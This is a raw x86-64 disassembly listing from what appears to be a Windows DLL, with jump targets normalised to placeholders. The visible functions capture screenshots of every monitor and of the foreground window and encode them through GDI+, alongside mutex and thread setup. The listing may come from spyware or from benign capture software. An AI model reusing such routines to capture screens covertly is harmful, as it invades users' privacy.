call j_sub_18002094c#2
mov [ rbp + 0x4f0 ] 0x7
mov [ rbp + 0x4e8 ] r14
mov [ rbp + 0x4d8 ] r14w
cmp [ rbp + 0x4c8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x4d8 ]
call j_sub_18002094c#2
mov [ rbp + 0x4c8 ] 0x7
mov [ rbp + 0x4c0 ] r14
mov [ rbp + 0x4b0 ] r14w
lea rcx [ rsp + 0x30 ]
call sub_180002870
jmp r-xdata
mov rcx [ rbp + 0x4b0 ]
call j_sub_18002094c#2
mov [ rbp + 0x4c8 ] 0x7
mov [ rbp + 0x4c0 ] r14
mov [ rbp + 0x4b0 ] r14w
lea rcx [ rsp + 0x30 ]
call sub_180002870
jmp r-xdata
mov rcx [ rbp + 0x4b0 ]
call j_sub_18002094c#2
sub_18000ab20
mov rax rsp
push rdi
sub rsp 0x70
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov rdi rcx
xor r8d r8d
xor edx edx
xor ecx ecx
call [ CreateMutexW@IAT ]
mov [ rdi + 0x78 ] rax
test rax rax
jne r-xdata
mov ecx 0x14
call [ Sleep@IAT ]
cmp [ rdi + 0x68 ] 0x0
je r-xdata
lea rax [ r--data ]
mov [ rsp + 0x80 ] rax
mov r8d 0x1
lea rdx [ rsp + 0x80 ]
lea rcx [ rsp + 0x38 ]
call sub_180020370
lea rdx [ r--data ]
lea rcx [ rsp + 0x38 ]
call sub_1800210a4
int3
mov ecx 0x14
call [ Sleep@IAT ]
jmp r-xdata
lea rdx [ rsp + 0x50 ]
lea rcx [ rdi + 0x48 ]
call sub_1800134c0
mov rcx rax
mov rax [ rax ]
test rax rax
je r-xdata
mov rcx [ rcx + 0x10 ]
mov rdx [ rax + 0x10 ]
cmp rdx rcx
ja r-xdata
mov rax [ rax ]
mov rax [ rax + 0x8 ]
mov rcx [ rax + rcx * 8 ]
xor eax eax
mov [ rsp + 0x28 ] rax
xor ebx ebx
mov [ rsp + 0x30 ] rbx
mov rdx [ rcx + 0x8 ]
mov r8 [ rcx ]
test rdx rdx
je r-xdata
sub rcx rdx
mov r9 [ rax + 0x10 ]
mov r8 [ rax + 0x8 ]
movzx edx [ rax + 0x6 ]
mov rcx rdi
call sub_1800094b0
lea rcx [ rdi + 0x48 ]
call sub_180008480
nop
test rbx rbx
je r-xdata
mov eax [ rdx + 0x8 ]
test eax eax
je r-xdata
[ rbx + 0x8 ]
jne r-xdata
mov rax [ rsp + 0x28 ]
mov rbx [ rsp + 0x30 ]
nop [ rax + rax ] eax
mov rbx [ rsp + 0x30 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rbx rdx
mov [ rsp + 0x30 ] rdx
mov rax r8
mov [ rsp + 0x28 ] rax
jmp r-xdata
mov eax [ rdx + 0x8 ]
test eax eax
jne r-xdata
mov rcx [ rsp + 0x30 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
jmp r-xdata
lea ecx [ rax + 0x1 ]
[ rdx + 0x8 ] ecx
je r-xdata
jmp r-xdata
sub_18000aca0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push r12
sub rsp 0x30
mov rbp rdx
xor ebx ebx
lea rcx [ rsp + 0x20 ]
lea rdx [ rsp + 0x58 ]
mov r12 r8
mov [ rsp + 0x20 ] ebx
mov [ rsp + 0x58 ] ebx
call GdipGetImageEncodersSize
cmp [ rsp + 0x58 ] ebx
jne r-xdata
mov ecx [ rsp + 0x58 ]
mov [ rsp + 0x40 ] rsi
call sub_1800213d4
mov rsi rax
test rax rax
jne r-xdata
or eax 0xffffffff
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
add rsp 0x30
pop r12
retn
mov edx [ rsp + 0x58 ]
mov ecx [ rsp + 0x20 ]
mov r8 rax
call GdipGetImageEncoders
mov r10d [ rsp + 0x20 ]
test r10d r10d
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov rcx rsi
call sub_18002094c
xor eax eax
lea r9 [ rsi + 0x40 ]
mov rsi [ rsp + 0x40 ]
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
add rsp 0x30
pop r12
retn
test edx edx
je r-xdata
add rax 0x2
test ecx ecx
jne r-xdata
mov edx ebx
imul rdx rdx 0x68
mov ecx [ rdx + rsi ]
mov [ r12 ] ecx
mov ecx [ rdx + rsi + 0x4 ]
mov [ r12 + 0x4 ] ecx
mov ecx [ rdx + rsi + 0x8 ]
mov [ r12 + 0x8 ] ecx
mov ecx [ rdx + rsi + 0xc ]
mov [ r12 + 0xc ] ecx
mov rcx rsi
call sub_18002094c
mov eax ebx
jmp r-xdata
inc ebx
add r9 0x68
cmp ebx r10d
jb r-xdata
movzx edx [ rax ]
movzx ecx [ rax + r8 ]
sub edx ecx
jne r-xdata
mov rax [ r9 ]
mov r8 rbp
sub r8 rax
nop [ rax + rax ] eax
sub_18000adb0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov rdi rcx
mov ebx edx
mov [ rcx ] rax
mov rcx [ rcx + 0x8 ]
call GdipDisposeImage
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call GdipFree
sub_18000adf0
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x8 ]
lea rdx [ rsp + 0x30 ]
mov [ rsp + 0x30 ] 0x0
call GdipCloneImage
test eax eax
je r-xdata
mov ecx 0x18
call GdipAlloc
test rax rax
je r-xdata
mov [ rbx + 0x10 ] eax
add rsp 0x20
pop rbx
retn
mov edx [ rbx + 0x10 ]
mov rcx [ rsp + 0x30 ]
lea r8 [ r--data ]
mov [ rax + 0x8 ] rcx
mov [ rax + 0x10 ] edx
mov [ rax ] r8
add rsp 0x20
pop rbx
retn
sub_18000ae50
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] rdi
mov rdi rdx
mov rbx rcx
mov rax 0x1fffffffffffffff
cmp rdx rax
jbe r-xdata
mov rax [ rcx + 0x10 ]
sub rax [ rcx ]
sar rax 0x3
cmp rax rdx
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
add rcx 0x18
call sub_180013450
mov rsi rax
mov [ rsp + 0x48 ] rax
mov r8 [ rbx + 0x8 ]
mov rdx [ rbx ]
sub r8 rdx
and r8 0xfffffffffffffff8
mov rcx rax
call sub_1800205e0
nop
mov rcx [ rbx ]
mov r12 [ rbx + 0x8 ]
sub r12 rcx
sar r12 0x3
test rcx rcx
je r-xdata
lea rax [ rsi + rdi * 8 ]
mov [ rbx + 0x10 ] rax
lea rax [ rsi + r12 * 8 ]
mov [ rbx + 0x8 ] rax
mov [ rbx ] rsi
call j_sub_18002094c#2
sub_18000af10
sub rsp 0x28
mov r10 [ rcx ]
mov r8 [ rcx + 0x8 ]
mov r9 0x1fffffffffffffff
sub r8 r10
mov rax r9
sar r8 0x3
sub rax rdx
cmp rax r8
jae r-xdata
add r8 rdx
mov rdx [ rcx + 0x10 ]
sub rdx r10
sar rdx 0x3
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
add rsp 0x28
retn
mov rax rdx
shr rax 0x1
sub r9 rax
cmp r9 rdx
jae r-xdata
add rdx rax
cmp rdx r8
cmovb rdx r8
call sub_18000ae50
xor edx edx
cmp rdx r8
cmovb rdx r8
add rsp 0x28
jmp sub_18000ae50
sub_18000af90
push rsi
sub rsp 0x20
mov rax [ rcx + 0x8 ]
mov [ rsp + 0x30 ] rbx
xor ebx ebx
sub rax [ rcx ]
mov rsi rcx
sar rax 0x3
test rax rax
je r-xdata
mov rdx [ rsi + 0x8 ]
mov rbx [ rsi ]
cmp rbx rdx
je r-xdata
mov rcx [ rsi ]
mov rcx [ rcx + rbx * 8 ]
call [ DeleteObject@IAT ]
mov rax [ rsi + 0x8 ]
inc rbx
sub rax [ rsi ]
sar rax 0x3
cmp rbx rax
jb r-xdata
mov rcx [ rsi ]
mov rbx [ rsp + 0x30 ]
test rcx rcx
je r-xdata
mov rax rdx
mov [ rsp + 0x38 ] rdi
mov rcx rbx
sub rax rdx
sar rax 0x3
lea rdi [ rax * 8 ]
mov r8 rdi
call sub_1800205e0
lea r11 [ rdi + rbx ]
mov rdi [ rsp + 0x38 ]
mov [ rsi + 0x8 ] r11
mov [ rsi ] 0x0
mov [ rsi + 0x8 ] 0x0
mov [ rsi + 0x10 ] 0x0
add rsp 0x20
pop rsi
retn
call j_sub_18002094c#2
sub_18000b040
mov [ rsp + 0x8 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x50
mov esi [ r8 + 0x4 ]
mov ebp [ r8 ]
mov r13 rdx
mov rcx r13
mov edx 0x8
mov r12 r9
call [ GetDeviceCaps@IAT ]
mov edx 0xa
mov rcx r13
mov edi eax
call [ GetDeviceCaps@IAT ]
mov rcx r13
mov ebx eax
call [ CreateCompatibleDC@IAT ]
mov r8d ebx
mov edx edi
mov rcx r13
mov r14 rax
mov [ rsp + 0x98 ] rax
call [ CreateCompatibleBitmap@IAT ]
mov rcx r14
mov rdx rax
mov r15 rax
call [ SelectObject@IAT ]
mov [ rsp + 0x40 ] 0x40cc0020
mov [ rsp + 0x38 ] esi
mov [ rsp + 0x30 ] ebp
mov r9d edi
xor r8d r8d
xor edx edx
mov rcx r14
mov [ rsp + 0x28 ] r13
mov [ rsp + 0xa0 ] rax
mov [ rsp + 0x20 ] ebx
call [ BitBlt@IAT ]
mov rcx [ r12 + 0x8 ]
lea rax [ rsp + 0x98 ]
cmp rax rcx
jae r-xdata
cmp rcx [ r12 + 0x10 ]
jne r-xdata
mov rax [ r12 ]
lea rdx [ rsp + 0x98 ]
cmp rax rdx
ja r-xdata
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
mov edx 0x1
mov rcx r12
call sub_18000af10
lea rbx [ rsp + 0x98 ]
sub rbx rax
sar rbx 0x3
cmp rcx [ r12 + 0x10 ]
jne r-xdata
add [ r12 + 0x8 ] 0x8
mov rcx r13
call [ DeleteObject@IAT ]
mov rcx [ rsp + 0xa0 ]
call [ DeleteObject@IAT ]
mov rcx r15
call [ DeleteObject@IAT ]
mov rcx r13
call [ DeleteObject@IAT ]
mov rbx [ rsp + 0x90 ]
mov eax 0x1
add rsp 0x50
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov [ rax ] r14
mov rdx [ r12 + 0x8 ]
test rdx rdx
je r-xdata
mov edx 0x1
mov rcx r12
call sub_18000af10
mov rax [ r12 ]
mov rcx [ rax + rbx * 8 ]
mov [ rdx ] rcx
jmp r-xdata
sub_18000b1b0
mov [ rsp + 0x10 ] rbx
push rsi
sub rsp 0x20
mov rsi rcx
mov rcx [ rcx ]
mov rax [ rsi + 0x8 ]
cmp rcx rax
je r-xdata
mov rdx [ rsi + 0x8 ]
mov rbx [ rsi ]
cmp rbx rdx
je r-xdata
sub rax rcx
xor ebx ebx
sar rax 0x3
test rax rax
je r-xdata
xor ecx ecx
call [ GetDC@IAT ]
lea r8 [ sub_18000b040 ]
mov r9 rsi
mov rcx rax
xor edx edx
mov rbx rax
call [ EnumDisplayMonitors@IAT ]
mov rdx rbx
xor ecx ecx
call [ ReleaseDC@IAT ]
mov rcx rbx
call [ DeleteObject@IAT ]
mov rbx [ rsp + 0x38 ]
mov al 0x1
add rsp 0x20
pop rsi
retn
mov rax rdx
mov [ rsp + 0x30 ] rdi
mov rcx rbx
sub rax rdx
sar rax 0x3
lea rdi [ rax * 8 ]
mov r8 rdi
call sub_1800205e0
lea r11 [ rdi + rbx ]
mov rdi [ rsp + 0x30 ]
mov [ rsi + 0x8 ] r11
nop [ rax + rax ] ax
mov rcx [ rsi ]
mov rcx [ rcx + rbx * 8 ]
call [ DeleteObject@IAT ]
mov rax [ rsi + 0x8 ]
inc rbx
sub rax [ rsi ]
sar rax 0x3
cmp rbx rax
jb r-xdata
sub_18000b280
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
sub rsp 0x20
mov rsi rcx
call sub_18000b1b0
mov rdx [ rsi + 0x8 ]
mov rax [ rsi ]
mov rbp rdx
sub rbp rax
sar rbp 0x3
cmp rax rdx
je r-xdata
mov rdx [ rsi + 0x8 ]
mov rbx [ rsi ]
cmp rbx rdx
je r-xdata
xor ebx ebx
test rbp rbp
je r-xdata
mov rbx [ rsp + 0x38 ]
mov eax ebp
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rsi
retn
mov rcx rdx
mov [ rsp + 0x30 ] rdi
sub rcx rdx
sar rcx 0x3
lea rdi [ rcx * 8 ]
mov rcx rbx
mov r8 rdi
call sub_1800205e0
lea r11 [ rdi + rbx ]
mov rdi [ rsp + 0x30 ]
mov [ rsi + 0x8 ] r11
nop [ rax + rax ] ax
mov rcx [ rsi ]
mov rcx [ rcx + rbx * 8 ]
call [ DeleteObject@IAT ]
mov rax [ rsi + 0x8 ]
inc rbx
sub rax [ rsi ]
sar rax 0x3
cmp rbx rax
jb r-xdata
sub_18000b330
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x8 ]
sub rsp 0x108
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x8 ] rax
movsxd r13 [ rbp + 0x78 ]
mov [ rbp - 0x78 ] rdx
mov r12 rcx
mov [ rbp - 0x70 ] r8
xor esi esi
lea rdx [ rbp - 0x68 ]
lea rcx [ rsp + 0x78 ]
xor r8d r8d
mov [ rsp + 0x68 ] r9d
mov [ rbp - 0x68 ] 0x1
mov [ rbp - 0x60 ] rsi
mov [ rbp - 0x58 ] rsi
call GdiplusStartup
mov rcx r12
mov [ rsp + 0x50 ] sil
call sub_18000b1b0
mov rax [ r12 + 0x8 ]
cmp [ r12 ] rax
jne r-xdata
cmp r13d 0xffffffff
je r-xdata
xor ecx ecx
call [ GetDC@IAT ]
lea edx [ rsi + 0xa ]
mov rcx rax
mov rdi rax
call [ GetDeviceCaps@IAT ]
lea edx [ rsi + 0x8 ]
mov rcx rdi
mov ebx eax
call [ GetDeviceCaps@IAT ]
mov r8d ebx
mov edx eax
mov rcx rdi
call [ CreateCompatibleBitmap@IAT ]
call [ GetForegroundWindow@IAT ]
lea rdx [ rbp - 0x50 ]
mov rcx rax
mov rbx rax
call [ GetWindowRect@IAT ]
mov r13d [ rbp - 0x48 ]
mov edi [ rbp - 0x44 ]
sub r13d [ rbp - 0x50 ]
sub edi [ rbp - 0x4c ]
mov rcx rbx
call [ GetWindowDC@IAT ]
mov r8d [ rbp - 0x44 ]
mov edx [ rbp - 0x48 ]
sub r8d [ rbp - 0x4c ]
sub edx [ rbp - 0x50 ]
mov r14 rax
mov rcx rax
mov rcx [ r12 ]
cmp rcx [ r12 + 0x8 ]
je r-xdata
mov rbx rsi
lea rax [ r--data ]
lea r8 [ rsp + 0x60 ]
xor edx edx
mov rcx r15
mov [ rsp + 0x60 ] rsi
mov [ rbx ] rax
call GdipCreateBitmapFromHBITMAP
mov [ rbx + 0x10 ] eax
mov rax [ rsp + 0x60 ]
mov [ rbx + 0x8 ] rax
jmp r-xdata
mov r14 [ rcx + r13 * 8 ]
mov edx 0xa
mov rcx r14
call [ GetDeviceCaps@IAT ]
mov edx 0x8
mov rcx r14
mov edi eax
call [ GetDeviceCaps@IAT ]
mov r8d edi
mov r13d eax
mov edx eax
mov rcx r14
jmp r-xdata
test rbx rbx
je r-xdata
mov rdx [ rsp + 0x58 ]
mov rcx [ rbx + 0x8 ]
lea r9 [ rbp - 0x40 ]
lea r8 [ rbp - 0x18 ]
call GdipSaveImageToStream
test eax eax
je r-xdata
mov eax [ r--data ]
mov rdx [ rbp + 0x70 ]
mov r13d 0x1
mov [ rbp - 0x38 ] eax
mov eax [ r--data ]
lea r8 [ rbp - 0x18 ]
mov [ rbp - 0x34 ] eax
mov eax [ r--data ]
mov rcx r12
mov [ rbp - 0x30 ] eax
mov eax [ r--data ]
mov [ rbp - 0x40 ] r13d
mov [ rbp - 0x2c ] eax
lea rax [ rsp + 0x68 ]
mov [ rbp - 0x24 ] 0x4
mov [ rbp - 0x20 ] rax
mov [ rbp - 0x28 ] r13d
call sub_18000aca0
lea r8 [ rsp + 0x58 ]
mov edx r13d
xor ecx ecx
call [ CreateStreamOnHGlobal@IAT ]
test eax eax
js r-xdata
call [ CreateCompatibleBitmap@IAT ]
mov rcx r14
mov r15 rax
call [ CreateCompatibleDC@IAT ]
mov rdx r15
mov rcx rax
mov rbx rax
mov [ rsp + 0x70 ] rax
call [ SelectObject@IAT ]
mov [ rsp + 0x40 ] 0xcc0020
mov [ rsp + 0x38 ] esi
mov [ rsp + 0x30 ] esi
mov r9d r13d
xor r8d r8d
xor edx edx
mov rcx rbx
mov [ rsp + 0x28 ] r14
mov [ rbp - 0x80 ] rax
mov [ rsp + 0x20 ] edi
call [ BitBlt@IAT ]
mov ecx 0x18
call GdipAlloc
mov rbx rax
test rax rax
je r-xdata
mov rcx [ rsp + 0x70 ]
call [ DeleteObject@IAT ]
mov rcx r15
call [ DeleteObject@IAT ]
mov rcx [ rbp - 0x80 ]
call [ DeleteObject@IAT ]
mov rdx [ r12 ]
mov rax [ r12 + 0x8 ]
sub rax rdx
sar rax 0x3
test rax rax
je r-xdata
mov rax [ rbx ]
mov edx r13d
mov rcx rbx
call [ rax ]
mov rcx [ rsp + 0x58 ]
lea r9 [ rsp + 0x60 ]
mov r8d 0x2
mov rax [ rcx ]
mov rdx rsi
call [ rax + 0x28 ]
test eax eax
js r-xdata
mov [ rbx + 0x10 ] eax
jmp r-xdata
mov rcx r14
call [ DeleteObject@IAT ]
mov rcx [ rsp + 0x78 ]
call GdiplusShutdown
movzx eax [ rsp + 0x50 ]
mov rcx [ rbp - 0x8 ]
xor rcx rsp
call sub_1800212e0
add rsp 0x108
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
nop
mov rcx [ rsp + 0x58 ]
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rcx [ rsp + 0x58 ]
xor r9d r9d
xor r8d r8d
mov rax [ rcx ]
mov rdx rsi
call [ rax + 0x28 ]
test eax eax
js r-xdata
mov rcx [ rdx + rsi * 8 ]
call [ DeleteObject@IAT ]
mov rdx [ r12 ]
mov rcx [ r12 + 0x8 ]
sub rcx rdx
inc rsi
sar rcx 0x3
cmp rsi rcx
jb r-xdata
mov ecx [ rsp + 0x60 ]
mov rdi [ rbp - 0x70 ]
mov rdx r13
mov [ rdi ] rcx
call sub_180021308
mov rcx [ rbp - 0x78 ]
mov [ rcx ] rax
test rax rax
je r-xdata
mov rcx [ rsp + 0x58 ]
mov r8d [ rdi ]
xor r9d r9d
mov r10 [ rcx ]
mov rdx rax
call [ r10 + 0x18 ]
mov ecx [ rsp + 0x50 ]
movzx ecx cl
test eax eax
cmovns ecx r13d
mov [ rsp + 0x50 ] ecx
sub_18000b6f0
push rbx
sub rsp 0x20
mov rbx [ rcx ]
test rbx rbx
je r-xdata
add rsp 0x20
pop rbx
retn
lea rcx [ rsp + 0x30 ]
xor edx edx
mov [ rsp + 0x38 ] rdi
call sub_18001f9f0
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
xor edi edi
lea rcx [ rsp + 0x30 ]
cmp [ rbx + 0x8 ] rdi
cmove rdi rbx
call sub_18001fa20
test rdi rdi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rdi [ rsp + 0x38 ]
mov rax [ rdi ]
mov edx 0x1
mov rcx rdi
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
sub_18000b790
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov [ rsp + 0x30 ] 0x0
mov rax [ rcx + 0x40 ]
mov rbx rdx
mov rdi [ rax ]
lea rcx [ rsp + 0x30 ]
mov [ rdx ] rdi
xor edx edx
call sub_18001f9f0
mov rax [ rdi + 0x8 ]
cmp rax 0xffffffffffffffff
jae r-xdata
lea rcx [ rsp + 0x30 ]
call sub_18001fa20
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
inc rax
mov [ rdi + 0x8 ] rax
sub_18000b7f0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_1800200a0
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18002094c#2
sub_18000b860
mov rax [ rcx - 0x18 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x18 ] rax
mov rax [ rcx - 0x8 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x8 ] rax
mov rax [ rcx - 0x18 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x18 ] rax
retn
sub_18000b8e0
mov [ rsp + 0x10 ] rbx
push rsi
sub rsp 0x20
mov rsi r8
mov rbx rdx
cmp rdx r8
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
mov [ rsp + 0x30 ] rdi
lea rdi [ rcx + 0x10 ]
nop
movzx ecx [ rbx ]
mov rdx rdi
call sub_18001f7a8
inc rbx
mov [ rbx - 0x1 ] al
cmp rbx rsi
jne r-xdata
mov rdi [ rsp + 0x30 ]
sub_18000b940
mov [ rsp + 0x10 ] rbx
push rsi
sub rsp 0x20
mov rsi r8
mov rbx rdx
cmp rdx r8
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
mov [ rsp + 0x30 ] rdi
lea rdi [ rcx + 0x10 ]
nop
movzx ecx [ rbx ]
mov rdx rdi
call sub_1800200ec
inc rbx
mov [ rbx - 0x1 ] al
cmp rbx rsi
jne r-xdata
mov rdi [ rsp + 0x30 ]
sub_18000b9e0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov edi edx
mov rbx rcx
mov [ rcx ] rax
mov eax [ rcx + 0x20 ]
test eax eax
jle r-xdata
jns r-xdata
mov rcx [ rcx + 0x18 ]
call sub_18002094c
jmp r-xdata
lea rax [ r--data ]
mov [ rbx ] rax
test dil 0x1
je r-xdata
mov rcx [ rcx + 0x18 ]
call j_sub_18002094c
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call j_sub_18002094c#2
sub_18000ba40
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_180020498
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18002094c#2
sub_18000ba70
push rbp
mov rbp rsp
sub rsp 0x60
mov eax [ rcx + 0x14 ]
and edx 0x17
and eax edx
mov [ rcx + 0x10 ] edx
je r-xdata
add rsp 0x60
pop rbp
retn
test r8b r8b
je r-xdata
mov [ rsp + 0x78 ] rbx
mov [ rbp - 0x40 ] 0x1
test al 0x4
je r-xdata
xor edx edx
xor ecx ecx
call sub_1800210a4
int3
test al 0x2
je r-xdata
call sub_18001ff58
lea rdx [ rbp + 0x10 ]
lea rcx [ rbp - 0x30 ]
mov rbx rax
lea rax [ r--data ]
mov [ rbp + 0x10 ] rax
call sub_180020424
mov rcx [ rbp - 0x40 ]
mov [ rbp - 0x18 ] rcx
lea rax [ r--data ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x30 ]
mov [ rbp - 0x10 ] rbx
mov [ rbp - 0x30 ] rax
call sub_1800210a4
int3
call sub_18001ff58
lea rdx [ rbp + 0x10 ]
lea rcx [ rbp - 0x30 ]
mov rbx rax
lea rax [ r--data ]
mov [ rbp + 0x10 ] rax
call sub_180020424
mov rcx [ rbp - 0x40 ]
mov [ rbp - 0x18 ] rcx
lea rax [ r--data ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x30 ]
mov [ rbp - 0x10 ] rbx
mov [ rbp - 0x30 ] rax
call sub_1800210a4
int3
call sub_18001ff58
lea rdx [ rbp + 0x10 ]
lea rcx [ rbp - 0x30 ]
mov rbx rax
lea rax [ r--data ]
mov [ rbp + 0x10 ] rax
call sub_180020424
mov rcx [ rbp - 0x40 ]
mov [ rbp - 0x18 ] rcx
lea rax [ r--data ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x30 ]
mov [ rbp - 0x10 ] rbx
mov [ rbp - 0x30 ] rax
call sub_1800210a4
int3
sub_18000bbc0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
call sub_180020510
lea r11 [ r--data ]
mov [ rdi ] r11
mov rax [ rbx + 0x18 ]
mov [ rdi + 0x18 ] rax
mov rax [ rbx + 0x20 ]
mov rbx [ rsp + 0x30 ]
mov [ rdi + 0x20 ] rax
mov rax rdi
add rsp 0x20
pop rdi
retn
sub_18000bc00
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
xor esi esi
xor r8d r8d
xor edx edx
mov rbx rcx
mov [ rcx + 0x18 ] 0x201
mov [ rcx + 0x20 ] 0x6
mov [ rcx + 0x40 ] rsi
mov [ rcx + 0x8 ] rsi
mov [ rcx + 0x14 ] esi
mov [ rcx + 0x28 ] rsi
mov [ rcx + 0x30 ] rsi
mov [ rcx + 0x38 ] rsi
call sub_18000ba70
lea ecx [ rsi + 0x8 ]
call sub_180021000
mov rdi rax
test rax rax
je r-xdata
mov [ rbx + 0x40 ] rsi
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
call sub_18001fdcc
mov [ rdi ] rax
call sub_18001fb7c
lea rcx [ rsp + 0x30 ]
xor edx edx
mov rsi rax
call sub_18001f9f0
mov rcx [ rsi + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rcx [ rsp + 0x30 ]
call sub_18001fa20
mov [ rbx + 0x40 ] rdi
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
inc rcx
mov [ rsi + 0x8 ] rcx
sub_18000bcc0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
call sub_180020510
lea r11 [ r--data ]
mov [ rdi ] r11
mov rax [ rbx + 0x18 ]
mov [ rdi + 0x18 ] rax
mov rax [ rbx + 0x20 ]
mov rbx [ rsp + 0x30 ]
mov [ rdi + 0x20 ] rax
lea rax [ r--data ]
mov [ rdi ] rax
mov rax rdi
add rsp 0x20
pop rdi
retn
sub_18000bd10
push rbx
sub rsp 0x40
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov rbx rcx
cmp [ rcx + 0x40 ] 0x0
jne r-xdata
xor al al
jmp r-xdata
mov ecx 0x60
call sub_180021000
mov [ rsp + 0x58 ] rax
test rax rax
je r-xdata
add rsp 0x40
pop rbx
retn
mov [ rbx + 0x50 ] rax
lea rcx [ rsp + 0x50 ]
mov [ rsp + 0x28 ] rcx
mov [ rsp + 0x20 ] 0x0
mov r9 rax
lea r8 [ sub_180012b50 ]
xor edx edx
xor ecx ecx
call [ CreateThread@IAT ]
mov [ rbx + 0x40 ] rax
cmp rax 0xffffffffffffffff
jne r-xdata
mov rcx rax
call sub_180012f50
nop
mov al 0x1
mov rbx [ rbx + 0x50 ]
test rbx rbx
je r-xdata
mov rcx rbx
call sub_180012e60
mov rcx rbx
call j_sub_18002094c#2
sub_18000bdd0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi [ rcx + 0x68 ]
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
test rdi rdi
je r-xdata
lea rcx [ rbx + 0x8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
jmp sub_180020254
mov rcx rdi
call sub_18000b6f0
mov rcx rdi
call j_sub_18002094c#2
sub_18000bec0
push rbx
sub rsp 0x20
mov rax [ rcx ]
mov rbx rcx
call [ rax + 0x30 ]
cmp eax 0xffffffff
jne r-xdata
mov rax [ rbx + 0x58 ]
dec [ rax ]
mov rcx [ rbx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
movzx eax [ rdx ]
add rsp 0x20
pop rbx
retn
or eax eax
add rsp 0x20
pop rbx
retn
sub_18000bf00
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x20
xor esi esi
mov rbx r8
mov rdi rdx
mov rbp rcx
test r8 r8
jle r-xdata
mov rax rsi
jmp r-xdata
mov [ rsp + 0x30 ] r12
nop [ rax ] eax
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov rdx [ rbp ]
mov rcx rbp
call [ rdx + 0x38 ]
cmp eax 0xffffffff
je r-xdata
mov rdx [ rbp + 0x40 ]
cmp rbx rax
mov rcx rdi
mov rdx [ rdx ]
